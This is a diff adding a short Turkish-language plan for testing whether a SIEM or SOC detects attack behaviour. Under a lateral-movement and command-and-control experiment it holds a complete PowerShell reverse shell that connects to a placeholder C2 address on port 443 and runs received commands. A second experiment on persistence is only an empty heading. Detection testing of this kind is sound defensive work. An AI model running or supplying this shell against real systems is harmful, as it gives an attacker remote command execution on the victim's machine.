@@ -1,0 +1,15 @@
+Bu deneyleri gerçekleştirebilmek için belli düzeyde kullanıcı yetkisine sahip olunması gerekebilir. Amacımız, bunları engelleme kabiliyetimizi ölçmek değil, tespit etme becerimizi değerlendirmektir. 
+
+######
+Deney 1: Yerel ağda yayılmaya yönelik veya internete doğru komuta sunucusu trafiği
+######
+Notlar: 
+- Aşağıdaki PowerShell kodu belirtilen IP adresine (KOMUTA_SUNUCUSU_IP) doğru, TCP 443 portu üzerinden bir bağlantı açacaktır. 
+- Bunun SIEM, SOC veya saldırı tespiti için kullanılan yapı tarafından tespit edilebilmesi gerekiyor. 
+
+$client = New-Object System.Net.Sockets.TCPClient('KOMUTA_SUNUCUSU_IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+######
+Deney 2: Kalıcı
+######
+Notlar: 
